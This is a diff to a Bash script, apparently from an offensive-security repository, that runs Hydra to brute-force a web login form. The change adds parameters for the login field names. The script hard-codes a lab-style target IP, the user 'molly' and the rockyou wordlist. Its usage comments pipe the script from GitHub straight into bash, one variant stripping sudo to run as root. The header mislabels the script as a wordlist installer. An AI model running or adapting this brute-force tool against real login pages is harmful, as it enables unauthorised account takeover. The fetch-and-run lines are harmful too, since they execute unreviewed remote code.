@@ -9,7 +9,7 @@
 # Script de NiPeGun para instalar la máxima cantidad posible de WordLists en texto plano en Debian
 #
 # Ejecución remota con parámetros (puede requerir permisos sudo):
-#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | bash -s '10.10.179.150' '/login' 'molly' '/home/user/Downloads/rockyou.txt''
+#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | bash -s '10.10.179.150' '/login' 'username' 'password' 'molly' '/home/user/Downloads/rockyou.txt''
 #
 # Ejecución remota como root (para sistemas sin sudo):
 #   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | sed 's-sudo--g' | bash
@@ -20,12 +20,16 @@
 
 vIP="$1"
 vSubURL="$2"
-vUsuario="$3"
-vUbicDicc="$4"
+vUserField="$3"
+vPassField="$4"
+vUsuario="$5"
+vUbicDicc="$6"
 
 
 vIP='10.10.179.150'
 vSubURL='/login'
+vUserField='username'
+vPassField='password'
 vUsuario='molly'
 vUbicDicc='/home/nipegun/Descargas/rockyou.txt'
 
@@ -36,7 +40,7 @@ vUbicDicc='/home/nipegun/Descargas/rockyou.txt'
   echo ""
 
 # Determinar el texto de error
-  vErrorText=$(curl -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL")
+  vErrorText=$(curl -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL" | cut -d' ' -f2)
 
 # Mostrar mensajes con error
   echo ""
@@ -53,5 +57,5 @@ vUbicDicc='/home/nipegun/Descargas/rockyou.txt'
   echo ""
   echo "  Probando ataque de fuerza bruta..."
   echo ""
-  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:username=^USER^&password=^PASS^:S=$vErrorCode" -V
-  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:username=^USER^&password=^PASS^:F=$vErrorText" -V
+  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:$vUserField=^USER^&$vPassField=^PASS^:S=$vErrorCode" -V
+  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:$vUserField=^USER^&$vPassField=^PASS^:F=$vErrorText" -V
